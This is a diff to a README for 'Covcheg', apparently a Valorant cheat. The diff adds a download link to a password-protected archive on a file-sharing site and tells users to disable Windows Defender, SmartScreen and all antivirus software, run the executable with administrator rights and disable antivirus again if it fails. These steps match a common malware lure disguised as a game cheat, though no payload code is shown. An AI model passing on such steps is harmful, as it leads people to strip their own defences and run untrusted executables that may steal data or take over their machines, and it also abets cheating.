@@ -5,8 +5,9 @@
 ---
 
 <p float="left">
-  <img src="https://i.imgur.com/27e1YP6.png" width="300" />
-  <img src="https://i.imgur.com/x6soV00.png" width="300" />
+  <img src="https://i.imgur.com/27e1YP6.png" width="250" />
+  <img src="https://i.imgur.com/x6soV00.png" width="250" />
+  <img src="https://i.imgur.com/fjY5n3U.jpeg" width="250" />
 </p>
 
 ## ⚙️ System Requirements
@@ -21,12 +22,13 @@ Before launching, make sure to configure your system as follows:
 
 ## 💾 Installation
 
-1. [Download] the latest version of Covcheg.  
+1. [Download](https://www.4sync.com/rar/Juzt2NK_/Covcheg.html) the latest version of Covcheg. (Password **COVCHEG**) 
 2. Disable Windows Defender, Smart Screen, and any other antivirus programs as listed in the System Requirements.  
 3. Extract the files to a preferred directory on your computer.  
-4. Run the executable file with administrator privileges.  
-5. Configure settings via the user interface before launching Valorant.  
-6. Launch Valorant and enjoy the enhanced features.
+4. Run the executable file with administrator privileges.
+5. If the cheat does not start, restart your PC, disable all antiviruses and try again.  
+6. Configure settings via the user interface before launching Valorant.  
+7. Launch Valorant and enjoy the enhanced features.
 
 *Note:* Always ensure your system is properly prepared before installation to avoid detection.
 
